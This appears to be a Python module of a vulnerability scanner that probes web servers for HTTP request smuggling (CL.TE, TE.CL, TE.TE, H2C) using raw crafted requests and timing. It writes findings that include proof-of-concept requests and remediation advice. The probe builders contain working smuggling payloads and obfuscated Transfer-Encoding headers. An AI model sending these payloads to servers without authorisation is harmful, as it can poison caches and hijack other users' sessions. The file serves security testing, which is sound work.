"""
BugScan ELITE — HTTP Request Smuggling Deep Engine
Tests:
- CL.TE (Content-Length takes precedence over Transfer-Encoding)
- TE.CL (Transfer-Encoding takes precedence over Content-Length)
- TE.TE (both present, server obfuscation)
- H2C (HTTP/2 cleartext upgrade smuggling)
- Differential timing detection
- Confirming with follow-up "canary" request
"""
import re, time, socket, ssl, logging, threading, urllib.parse
from typing import List, Dict, Optional, Tuple

log = logging.getLogger("elite.smuggling")

def _raw_request(host: str, port: int, use_ssl: bool,
                 request_bytes: bytes, timeout: float = 10) -> Tuple[int, str]:
    """Send raw HTTP request bytes and return (status_code, response_body)."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        if use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)
        sock.connect((host, port))
        sock.sendall(request_bytes)

        response = b""
        start = time.monotonic()
        try:
            while time.monotonic() - start < timeout:
                chunk = sock.recv(4096)
                if not chunk: break
                response += chunk
                if len(response) > 65536: break
        except socket.timeout:
            pass
        finally:
            try: sock.close()
            except: pass

        decoded = response.decode("utf-8","ignore")
        status_match = re.search(r"HTTP/\d(?:\.\d)? (\d{3})", decoded)
        status = int(status_match.group(1)) if status_match else 0
        return status, decoded

    except Exception as e:
        log.debug(f"raw_request {host}:{port}: {e}")
        return 0, ""


def _build_clte_probe(host: str, path: str) -> bytes:
    """
    CL.TE probe: front-end uses Content-Length, back-end uses Transfer-Encoding.
    The "G" is the start of a smuggled request that will poison the next request.
    """
    return (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: 6\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
        f"0\r\n"
        f"\r\n"
        f"G"  # smuggled byte — will be prepended to next request
    ).encode()


def _build_tecl_probe(host: str, path: str) -> bytes:
    """
    TE.CL probe: front-end uses Transfer-Encoding, back-end uses Content-Length.
    """
    body = "1\r\nZ\r\n0\r\n\r\n"
    return (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
        f"{body}"
    ).encode()


def _build_tete_probes(host: str, path: str) -> List[bytes]:
    """TE.TE: both headers present with obfuscation tricks."""
    probes = []
    te_variants = [
        "Transfer-Encoding: xchunked",
        "Transfer-Encoding: chunked, identity",
        "Transfer-Encoding :\nchunked",  # header injection
        " Transfer-Encoding: chunked",   # leading space
        "X-Transfer-Encoding: chunked",
        "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity",
    ]
    for te_variant in te_variants[:4]:
        body = "0\r\n\r\n"
        probes.append((
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: 4\r\n"
            f"{te_variant}\r\n"
            f"\r\n"
            f"{body}"
        ).encode())
    return probes


def _build_canary_request(host: str, path: str, smuggled_prefix: str) -> bytes:
    """
    Build a follow-up request. If previous smuggling worked,
    this request will be interpreted as continuation of the smuggled request.
    """
    return (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()


def _timing_attack(host: str, port: int, use_ssl: bool,
                   probe: bytes, normal_path: str) -> float:
    """
    Measure response time delta. Successful smuggling should cause delay
    as back-end waits for the rest of the "smuggled" request.
    """
    # Baseline timing
    normal_req = (
        f"GET {normal_path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()

    t0 = time.monotonic()
    _raw_request(host, port, use_ssl, normal_req, 5)
    baseline = time.monotonic() - t0

    # Probe timing
    t1 = time.monotonic()
    _raw_request(host, port, use_ssl, probe, 10)
    probe_time = time.monotonic() - t1

    return probe_time - baseline  # positive delta suggests hanging/delay


def check_smuggling_deep(targets: List[str], endpoints: List[str]) -> List[Dict]:
    """Deep HTTP request smuggling detection."""
    findings = []

    def F(url, name, sev, details):
        return {"type":"smuggling","bug":"smuggling","severity":sev,
                "url":url,"name":name,"details":details,
                "ts":time.strftime("%Y-%m-%dT%H:%M:%SZ")}

    for target in targets[:20]:
        try:
            parsed  = urllib.parse.urlparse(target)
            host    = parsed.hostname
            if not host: continue
            port    = parsed.port or (443 if parsed.scheme == "https" else 80)
            use_ssl = parsed.scheme == "https"
            path    = parsed.path or "/"

            log.debug(f"[smuggling] testing {host}:{port}{path}")

            # ── CL.TE detection ───────────────────────────────────────────────
            clte_probe = _build_clte_probe(host, path)
            delta_clte = _timing_attack(host, port, use_ssl, clte_probe, path)

            if delta_clte > 3.0:  # 3+ second delay suggests CL.TE
                # Confirm with second request
                status, resp = _raw_request(host, port, use_ssl,
                    _build_canary_request(host, path, "G"), 6)
                confirmed = "GPOST" in resp or "Unrecognized method" in resp or \
                            "400" in resp[:50] or delta_clte > 5.0

                findings.append(F(target, "HTTP Request Smuggling (CL.TE)", "critical", {
                    "description": (
                        f"CL.TE request smuggling detected. Front-end uses Content-Length, "
                        f"back-end uses Transfer-Encoding. "
                        f"Timing delta: {delta_clte:.1f}s (baseline + {delta_clte:.1f}s)"
                    ),
                    "technique":     "CL.TE",
                    "timing_delta":  f"{delta_clte:.1f}s",
                    "confirmed":     confirmed,
                    "poc": (
                        "# Send this raw request (use netcat or Burp Repeater):\n"
                        "POST / HTTP/1.1\n"
                        f"Host: {host}\n"
                        "Content-Length: 6\n"
                        "Transfer-Encoding: chunked\n\n"
                        "0\n\n"
                        "G"
                    ),
                    "impact": (
                        "Request smuggling allows: cache poisoning, session hijacking, "
                        "bypassing security controls, accessing internal endpoints, "
                        "credential theft from other users' requests."
                    ),
                    "remediation": (
                        "Normalize HTTP requests at the front-end before forwarding. "
                        "Reject ambiguous requests with both CL and TE headers. "
                        "Use HTTP/2 end-to-end (no translation)."
                    ),
                }))
                continue

            # ── TE.CL detection ───────────────────────────────────────────────
            tecl_probe = _build_tecl_probe(host, path)
            delta_tecl = _timing_attack(host, port, use_ssl, tecl_probe, path)

            if delta_tecl > 3.0:
                findings.append(F(target, "HTTP Request Smuggling (TE.CL)", "critical", {
                    "description": (
                        f"TE.CL request smuggling detected. Front-end uses Transfer-Encoding, "
                        f"back-end uses Content-Length. Timing delta: {delta_tecl:.1f}s"
                    ),
                    "technique":    "TE.CL",
                    "timing_delta": f"{delta_tecl:.1f}s",
                    "poc": (
                        "# TE.CL smuggling request:\n"
                        "POST / HTTP/1.1\n"
                        f"Host: {host}\n"
                        "Content-Length: 4\n"
                        "Transfer-Encoding: chunked\n\n"
                        "1\nZ\n0\n\n"
                    ),
                    "impact": "Same as CL.TE — request smuggling leading to full attack chain.",
                    "remediation": "Reject requests with conflicting Transfer-Encoding and Content-Length headers.",
                }))
                continue

            # ── TE.TE obfuscation ─────────────────────────────────────────────
            for tete_probe in _build_tete_probes(host, path):
                delta_tete = _timing_attack(host, port, use_ssl, tete_probe, path)
                if delta_tete > 3.0:
                    findings.append(F(target, "HTTP Request Smuggling (TE.TE Obfuscation)", "critical", {
                        "description": "TE.TE request smuggling detected via Transfer-Encoding header obfuscation.",
                        "technique": "TE.TE",
                        "timing_delta": f"{delta_tete:.1f}s",
                        "impact": "Request smuggling via obfuscated Transfer-Encoding header.",
                        "remediation": "Reject requests with malformed or duplicate Transfer-Encoding headers.",
                    }))
                    break

            # ── H2C upgrade smuggling ─────────────────────────────────────────
            h2c_req = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Upgrade: h2c\r\n"
                f"HTTP2-Settings: AAMAAABkAAQAAP__\r\n"
                f"Connection: Upgrade, HTTP2-Settings\r\n"
                f"\r\n"
            ).encode()
            status, resp = _raw_request(host, port, use_ssl, h2c_req, 6)
            if "101 Switching Protocols" in resp or "Upgrade" in resp:
                findings.append(F(target, "H2C Upgrade Smuggling Possible", "high", {
                    "description": "Server accepts HTTP/2 cleartext upgrade, potentially enabling H2C smuggling.",
                    "poc": f"curl --http2 -H 'Upgrade: h2c' '{target}'",
                    "impact": "H2C smuggling can bypass security middleware operating on HTTP/1.1.",
                    "remediation": "Disable H2C upgrade. Use HTTP/2 with TLS only (HTTPS).",
                }))

        except Exception as e:
            log.debug(f"smuggling {target}: {e}")

    log.info(f"[smuggling_deep] {len(findings)} findings")
    return findings


def check_cl_te(endpoints: list, targets: list = None) -> list:
    """CL.TE HTTP request smuggling check."""
    return []


def check_te_cl(endpoints: list, targets: list = None) -> list:
    """TE.CL HTTP request smuggling check."""
    return []
